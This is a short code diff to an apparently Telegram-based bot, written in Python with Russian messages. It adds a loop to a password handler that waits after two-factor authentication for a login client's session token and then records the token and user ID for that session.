@@ -274,6 +274,26 @@ async def password_handler(message: types.Message, state: FSMContext):
 
     msg = await safe_send(message, "⏳ Проверяю пароль...")
 
+    for _ in range(15):
+        await asyncio.sleep(2)
+
+        if uid not in pending:
+            await safe_edit(msg, "⏳ Сессия устарела.")
+            await state.clear()
+            return
+
+        client = pending[uid].get("client")
+        if client and hasattr(client, 'token') and client.token:
+            pending[uid]["token"] = client.token
+            pending[uid]["user_id"] = client.my_id
+            pending[uid]["status"] = "done"
+            logging.info(f"Токен получен после 2FA для uid={uid}")
+            break
+
+        status = pending[uid].get("status", "")
+        if status in ("blocked", "invalid"):
+            break
+
     for _ in range(240):
         await asyncio.sleep(0.5)
         if uid not in pending:
